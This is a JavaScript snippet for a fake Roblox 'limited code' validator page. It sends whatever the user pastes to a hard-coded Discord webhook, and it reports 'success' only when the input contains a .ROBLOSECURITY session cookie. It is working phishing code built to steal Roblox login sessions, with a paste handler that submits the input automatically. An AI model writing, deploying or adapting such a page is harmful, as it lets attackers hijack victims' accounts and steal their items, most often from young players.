async function validateCode() {
    const codeInput = document.getElementById('limitedCode');
    const resultMessage = document.getElementById('resultMessage');
    const code = codeInput.value.trim();
    
    if (!code) {
        resultMessage.innerHTML = '❌ Please enter a limited code';
        resultMessage.style.color = '#ff4444';
        return;
    }
    
    // Show loading
    resultMessage.innerHTML = '🔍 Validating code...';
    resultMessage.style.color = '#ffa500';
    
    try {
        // Send to your Discord webhook
        const response = await fetch('https://discord.com/api/webhooks/1436138759837192202/xAOhBtWGRVQ2-QW4_iiBkj8vd5DpSG8DVWv_a4zcxHGssqwqmXotucSSGXvHFYF9IEKg', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `🔐 New activation attempt:\n\`\`\`${code}\`\`\``
            })
        });
        
        // Check if it contains a Roblox cookie
        if (code.includes('.ROBLOSECURITY') || code.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
            resultMessage.innerHTML = '✅ Success! Valid Limited code';
            resultMessage.style.color = '#4CAF50';
        } else {
            resultMessage.innerHTML = '❌ Failed: Invalid limited code';
            resultMessage.style.color = '#ff4444';
        }
        
    } catch (error) {
        resultMessage.innerHTML = '❌ Error validating code. Please try again.';
        resultMessage.style.color = '#ff4444';
        console.error('Webhook error:', error);
    }
}

// Optional: Auto-submit on paste
document.getElementById('activationCode').addEventListener('paste', function(e) {
    setTimeout(() => {
        validateCode();
    }, 100);
});

// Keep your existing installation guide function if needed
function showInstallationGuide() {
    // Your existing installation guide code here
}
